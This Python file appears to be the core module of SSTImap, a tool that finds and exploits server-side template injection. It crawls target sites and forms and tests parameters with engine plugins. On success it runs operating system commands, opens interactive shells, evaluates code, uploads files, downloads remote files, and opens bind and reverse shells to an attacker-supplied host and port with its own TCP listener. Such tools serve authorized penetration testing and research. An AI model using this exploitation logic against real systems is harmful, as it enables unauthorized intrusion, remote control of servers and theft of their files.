import json
import os
import telnetlib
import urllib
from urllib import parse
import socket
from utils.loggers import log
from core.clis import Shell, MultilineShell
from core.tcpserver import TcpServer
from utils.crawler import crawl, find_forms
from core.channel import Channel


def plugins(legacy=False, quick_generic=False):
    from core.plugin import loaded_plugins
    plugin_list = []
    if legacy:
        plugin_list += loaded_plugins.get("legacy_engines", [])
    plugin_list += loaded_plugins.get("engines", [])
    plugin_list += loaded_plugins.get("languages", [])
    plugin_list += loaded_plugins.get("custom", [])
    for group in loaded_plugins:
        if group not in ["legacy_engines", "engines", "languages", "custom", "generic"]:
            plugin_list += loaded_plugins.get(group, [])
    plugin_list += loaded_plugins.get("generic", [])
    if quick_generic:
        all_plugin_list = plugin_list
        plugin_list = []
        for p in all_plugin_list:
            if not p.generic_plugin:
                plugin_list.append(p)
    return plugin_list


def print_injection_summary(channel):
    prefix = channel.data.get('prefix', '').replace('\n', '\\n')
    render = channel.data.get('render', '{code}').replace('\n', '\\n').format(code='*')
    suffix = channel.data.get('suffix', '').replace('\n', '\\n')
    wrapper = channel.data.get('wrapper', '{code}').replace('\n', '\\n').format(code=render)
    if channel.data.get('evaluate_blind'):
        evaluation = f"\033[92mok\033[0m, {channel.data.get('language')} code (blind)"
    elif channel.data.get('evaluate'):
        evaluation = f"\033[92mok\033[0m, {channel.data.get('language')} code"
    else:
        evaluation = '\033[91mno\033[0m'
    if channel.data.get('execute_blind'):
        execution = '\033[92mok\033[0m (blind)'
    elif channel.data.get('execute'):
        execution = '\033[92mok\033[0m'
    else:
        execution = '\033[91mno\033[0m'
    if channel.data.get('write'):
        if channel.data.get('blind'):
            writing = '\033[92mok\033[0m (blind)'
        else:
            writing = '\033[92mok\033[0m'
    else:
        writing = '\033[91mno\033[0m'
    log.log(21, f"""SSTImap identified the following injection point:

  {channel.injs[channel.inj_idx]['field']} parameter: {channel.injs[channel.inj_idx]['param']}
  Engine: {channel.data.get('engine').capitalize()}
  Injection: {prefix}{wrapper}{suffix}
  Context: {'text' if (not prefix and not suffix) else 'code'}
  OS: {channel.data.get('os', 'undetected')}
  Technique: {'blind' if channel.data.get('blind') else 'render'}
  Capabilities:

    Shell command execution: {execution}
    Bind and reverse shell: {f'{chr(27)}[91mno{chr(27)}[0m' if not channel.data.get('bind_shell') else f'{chr(27)}[92mok{chr(27)}[0m'}
    File write: {writing}
    File read: {f'{chr(27)}[91mno{chr(27)}[0m' if not channel.data.get('read') else f'{chr(27)}[92mok{chr(27)}[0m'}
    Code evaluation: {evaluation}
""")


def detect_template_injection(channel):
    for i in range(len(channel.injs)):
        log.log(28, f"Testing if {channel.injs[channel.inj_idx]['field']} parameter '{channel.injs[channel.inj_idx]['param']}' is injectable")
        for plugin in plugins(legacy=channel.args.get('legacy'), quick_generic=channel.args.get('skip_generic')):
            current_plugin = plugin(channel)
            if channel.args.get('engine') and channel.args.get('engine').lower() != current_plugin.plugin.lower():
                continue
            current_plugin.detect()
            if channel.data.get('engine'):
                return current_plugin
        channel.inj_idx += 1


def check_template_injection(channel):
    current_plugin = detect_template_injection(channel)
    if not channel.data.get('engine'):
        log.log(22, "Tested parameters appear to be not injectable.")
        return current_plugin
    print_injection_summary(channel)
    if not any(f for f, v in channel.args.items() if f in ('os_cmd', 'os_shell', 'upload', 'download', 'tpl_shell',
                                                           'tpl_code', 'bind_shell', 'reverse_shell', 'eval_shell',
                                                           'eval_code', 'interactive') and v):
        log.log(21, f"""Rerun SSTImap providing one of the following options:
    \033[92m--interactive\033[0m                Run SSTImap in interactive mode to switch between exploitation modes without losing progress.{'''
    --os-shell                   Prompt for an interactive operating system shell.
    --os-cmd                     Execute an operating system command.''' if channel.data.get('execute') or channel.data.get('execute_blind') else ''}{'''
    --eval-shell                 Prompt for an interactive shell on the template engine base language.
    --eval-cmd                   Evaluate code in the template engine base language.''' if channel.data.get('evaluate') or channel.data.get('evaluate_blind') else ''}{'''
    --tpl-shell                  Prompt for an interactive shell on the template engine.
    --tpl-cmd                    Inject code in the template engine.''' if channel.data.get('engine') else ''}{'''
    --bind-shell PORT            Connect to a shell bind to a target port.''' if channel.data.get('bind_shell') else ''}{'''
    --reverse-shell HOST PORT    Send a shell back to the attacker's port.''' if channel.data.get('reverse_shell') else ''}{'''
    --upload LOCAL REMOTE        Upload files to the server.''' if channel.data.get('write') else ''}{'''
    --download REMOTE LOCAL      Download remote files.''' if channel.data.get('read') else ''}""")
        return current_plugin
    # Execute operating system commands
    if channel.args.get('os_cmd') or channel.args.get('os_shell'):
        if channel.data.get('execute_blind'):
            log.log(23, """Blind injection has been found and command execution will not produce any output.""")
            log.log(26, 'Delay is introduced appending \'&& sleep <delay>\' to the shell commands. '
                        'True or False is returned whether it returns successfully or not.')
            if channel.args.get('os_cmd'):
                print(current_plugin.execute_blind(channel.args.get('os_cmd')))
            elif channel.args.get('os_shell'):
                log.log(21, 'Run commands on the operating system.')
                Shell(current_plugin.execute_blind, f"{channel.data.get('os', 'undetected')} (blind) $ ").cmdloop()
        elif channel.data.get('execute'):
            if channel.args.get('os_cmd'):
                print(current_plugin.execute(channel.args.get('os_cmd')))
            elif channel.args.get('os_shell'):
                log.log(21, 'Run commands on the operating system.')
                Shell(current_plugin.execute, f"{channel.data.get('os', 'undetected')} $ ").cmdloop()
        else:
            log.log(22, 'No system command execution capabilities have been detected on the target.')
    # Execute template commands
    if channel.args.get('tpl_code') or channel.args.get('tpl_shell'):
        if channel.data.get('engine'):
            if channel.data.get('blind'):
                log.log(23, 'Only blind execution has been found. '
                            'Injected template code will not produce any output.')
                call = current_plugin.inject
            else:
                call = current_plugin.render
            if channel.args.get('tpl_code'):
                print(call(channel.args.get('tpl_code')))
            elif channel.args.get('tpl_shell'):
                log.log(21, 'Inject multi-line template code. '
                            'Press ctrl-D or type \'EOF\' on a new line to send the lines')
                MultilineShell(call, f"{channel.data.get('engine', '')} > ").cmdloop()
        else:
            log.log(22, 'No template code evaluation capabilities have been detected on the target')
    # Execute language commands
    if channel.args.get('eval_code') or channel.args.get('eval_shell'):
        if channel.data.get('evaluate_blind'):
            log.log(23, 'Only blind execution has been found. '
                        'Injected code will not produce any output.')
            if channel.args.get('eval_code'):
                print(current_plugin.evaluate_blind(channel.args.get('eval_code')))
            elif channel.args.get('eval_shell'):
                log.log(21, 'Evaluate multi-line template base language code. '
                            'Press ctrl-D or type \'EOF\' on a new line to send the lines')
                MultilineShell(current_plugin.evaluate_blind, f"{channel.data.get('language', '')} > ").cmdloop()
        elif channel.data.get('evaluate'):
            if channel.args.get('eval_code'):
                print(current_plugin.evaluate(channel.args.get('eval_code')))
            elif channel.args.get('eval_shell'):
                log.log(21, 'Evaluate multi-line template base language code. '
                            'Press ctrl-D or type \'EOF\' on a new line to send the lines')
                MultilineShell(current_plugin.evaluate, f"{channel.data.get('language', '')} > ").cmdloop()
        else:
            log.log(22, 'No language code evaluation capabilities have been detected on the target')
    # Perform file upload
    local_remote_paths = channel.args.get('upload')
    if local_remote_paths:
        if channel.data.get('write'):
            local_path, remote_path = local_remote_paths
            try:
                with open(local_path, 'rb') as f:
                    data = f.read()
                current_plugin.write(data, remote_path)
            except FileNotFoundError:
                log.log(25, f'Local file not found: {local_path}')
        else:
            log.log(22, 'No file upload capabilities have been detected on the target')
    # Perform file read
    remote_local_paths = channel.args.get('download')
    if remote_local_paths:
        if channel.data.get('read'):
            remote_path, local_path = remote_local_paths
            content = current_plugin.read(remote_path)
            with open(local_path, 'wb') as f:
                f.write(content)
        else:
            log.log(22, 'No file download capabilities have been detected on the target')
    # Connect to tcp shell
    bind_shell_port = channel.args.get('bind_shell')
    if bind_shell_port:
        if channel.data.get('bind_shell'):
            urlparsed = parse.urlparse(channel.base_url)
            if not urlparsed.hostname:
                log.log(22, "Error parsing hostname")
                return current_plugin
            for idx, thread in enumerate(current_plugin.bind_shell(bind_shell_port, shell=channel.args.get('remote_shell'))):
                log.log(26, f'Spawn a shell on remote port {bind_shell_port} with payload {idx+1}')
                thread.join(timeout=1)
                if not thread.is_alive():
                    continue
                try:
                    telnetlib.Telnet(urlparsed.hostname.decode(), bind_shell_port, timeout=5).interact()
                    # If telnetlib does not rise an exception, we can assume that
                    # ended correctly and return from `run()`
                    return current_plugin
                except Exception as e:
                    log.debug(f"Error connecting to {urlparsed.hostname}:{bind_shell_port} {e}")
        else:
            log.log(22, 'No TCP shell opening capabilities have been detected on the target')
    # Accept reverse tcp connections
    reverse_shell_host_port = channel.args.get('reverse_shell')
    if reverse_shell_host_port:
        host, port = reverse_shell_host_port
        timeout = 15
        if channel.data.get('reverse_shell'):
            current_plugin.reverse_shell(host, port, shell=channel.args.get('remote_shell'))
            # Run tcp server
            try:
                TcpServer(int(port), timeout)
            except socket.timeout:
                log.log(22, f"No incoming TCP shells after {timeout}s, quitting.")
        else:
            log.log(22, 'No reverse TCP shell capabilities have been detected on the target')
    return current_plugin


def scan_website(args):
    urls = set()
    forms = set()
    single_url = args.get('url', None)
    if single_url:
        urls.add(single_url)
    preloaded_urls = args.get('loaded_urls', None)
    if preloaded_urls:
        urls.update(preloaded_urls)
    preloaded_forms = args.get('loaded_forms', None)
    if preloaded_forms:
        forms.update(preloaded_forms)
    if args['load_forms']:
        if os.path.isdir(args['load_forms']):
            args['load_forms'] = f"{args['load_forms']}/forms.json"
        if os.path.exists(args['load_forms']):
            try:
                with open(args['load_forms'], 'r') as stream:
                    loaded_forms = set([tuple(x) for x in json.load(stream)])
                forms.update(loaded_forms)
                log.log(21, f"Loaded {len(loaded_forms)} forms from file: {args['load_forms']}")
            except Exception as e:
                log.log(22, f"Error occurred while loading forms from file:\n{repr(e)}")
    if not forms or args['forms']:
        if args['load_urls']:
            if os.path.isdir(args['load_urls']):
                args['load_urls'] = f"{args['load_urls']}/urls.txt"
            if os.path.exists(args['load_urls']):
                try:
                    with open(args['load_urls'], 'r') as stream:
                        loaded_urls = set([x.strip() for x in stream.readlines()])
                    urls.update(loaded_urls)
                    log.log(21, f"Loaded {len(loaded_urls)} URL(s) from file: {args['load_urls']}")
                except Exception as e:
                    log.log(22, f"Error occurred while loading URLs from file:\n{repr(e)}")
        if args['crawl_depth']:
            crawled_urls = crawl(urls, args)
            urls.update(crawled_urls)
            args['crawled_urls'] = crawled_urls
            if args['save_urls']:
                if os.path.isdir(args['save_urls']):
                    args['save_urls'] = f"{args['save_urls']}/sstimap_urls.txt"
                try:
                    with open(args['save_urls'], 'w') as stream:
                        stream.write("\n".join(crawled_urls))
                    log.log(21, f"Saved URLs to file: {args['save_urls']}")
                except Exception as e:
                    log.log(22, f"Error occurred while saving URLs to file:\n{repr(e)}")
    else:
        log.log(25, "Skipping URL loading and crawling as forms are already supplied")
    args['target_urls'] = urls
    if args['forms']:
        crawled_forms = find_forms(urls, args)
        forms.update(crawled_forms)
        args['crawled_forms'] = crawled_forms
        if args['save_forms'] and crawled_forms:
            if os.path.isdir(args['save_forms']):
                args['save_forms'] = f"{args['save_forms']}/sstimap_forms.json"
            try:
                with open(args['save_forms'], 'w') as stream:
                    json.dump([x for x in crawled_forms], stream, indent=4)
                log.log(21, f"Saved forms to file: {args['save_forms']}")
            except Exception as e:
                log.log(22, f"Error occurred while saving forms to file:\n{repr(e)}")
    args['target_forms'] = forms
    if not urls and not forms:
        log.log(22, 'No targets found')
        return None, None
    elif not forms:
        for url in urls:
            log.log(27, f'Scanning url: {url}')
            url_args = args.copy()
            url_args['url'] = url
            channel = Channel(url_args)
            result = check_template_injection(channel)
            if channel.data.get('engine'):
                return result, channel # TODO: save vulnerabilities
    else:
        for form in forms:
            log.log(27, f'Scanning form with url: {form[0]}')
            url_args = args.copy()
            url_args['url'] = form[0]
            url_args['method'] = form[1]
            url_args['data'] = urllib.parse.parse_qs(form[2], keep_blank_values=True)
            channel = Channel(url_args)
            result = check_template_injection(channel)
            if channel.data.get('engine'):
                return result, channel # TODO: save vulnerabilities
    return None, None